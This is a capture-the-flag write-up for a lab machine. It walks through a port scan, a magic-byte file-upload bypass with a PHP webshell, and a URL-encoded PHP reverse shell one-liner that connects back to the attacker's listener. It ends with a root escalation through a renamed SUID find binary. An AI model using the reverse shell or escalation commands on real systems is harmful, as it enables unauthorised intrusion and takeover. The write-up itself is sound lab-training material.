CTF-Labor-200-02

Target IP: 192.168.242.33
Challenge Description: Part 2 of Labor Day CTF Machine.

Reconnaissance


Performing a port scan against the target machine shows there are two TCP ports open: SSH and HTTP on their standard ports, as shown above.


Performing an aggressive port scan against the two TCP ports returns the result above. By the looks of it, only HTTP is interesting to me. I will start enumeration there.

Enumeration

Port 80: HTTP

The webpage above is displayed for this web application. Is MZEE-AV the name of the application on this port? And nope, doing a Google search shows no result. This application does allow file upload. Maybe it is vulnerable to file upload attacks?


I created a text file with the name test.txt. Then I uploaded this file using this application successfully. The webpage above is shown to me after uploading my test file.


After finding nothing, I decided to perform a directory search using the command gobuster dir -u http://192.168.242.33/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x html,php and got two interesting directories: /upload and /backups. I did not find the first directory interesting, however the second one is useful.


Browsing to http://192.168.242.33/backups/ displays the webpage above. There is an interesting zip file with the name backup.zip, as shown above. I downloaded this file on my machine.


The contents of this zip file is shown above. Is this the source-code of the web application on port 80?


The source code, shown above of upload.php, is interesting to me. It seems to check for magicbytes of 4D5A. Doing a Google search for 4D5A magicbytes shows it decodes to MZ. Maybe I can use this new magicbytes to upload files successfully? Time to exploit it.

Exploitation


I intercepted a file upload via Burpsuite. Then I made changes to the request from lines 14 to 20. I inserted the MZ magicbytes at line 14. Then a simple PHP webshell that I can use for RCE.


From previous enumeration, I know the files are uploaded at /upload/ directory.


And bingo! Now I can perform RCE using my new simple PHP webshell, as shown above. Time to obtain a reverse shell connection now.


Since the web application already uses PHP, I can deploy a PHP reverse shell. I started a listener on my machine at port 8443. Then I used the following URL encoded PHP reverse shell php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.45.203%22%2C8443%29%3Bpopen%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%2C%20%22r%22%29%3B%27. And bingo! I successfully obtained a reverse shell connection from the target machine with the session as www-data, as shown above.

Privilege Escalation


There is a user called avuser on the target machine, as shown above.


I upgraded my shell to a TTY using the command python3 -c 'import pty; pty.spawn("/bin/bash");'. Then using the command find / -perm -u=s -type f 2>/dev/null, I obtained an interesting entry with the name /opt/fileS. The target machine does not have strings installed, so I cannot identify what it is.


However, running /fileS --help shows the interesting information above.


I did a Google search for [-H] [-L] [-P] [-Olevel] [-D debugopts] [path...] [expression] and obtained a very interesting information. The fileS binary is find as it uses the same parameters.


And bingo! Now I have a root shell by exploiting the find binary, using the command ./fileS . -exec /bin/sh -p \; -quit, with SUID privileges. Now I have full privileges on the target machine as the root user.

Flags


The local.txt flag is shown above. This flag is located inside the home directory of user avuser.


The proof.txt and email2.txt flags are shown above. These flags are obtainable after escalating privileges to user root by exploiting the mysterious find binary file.
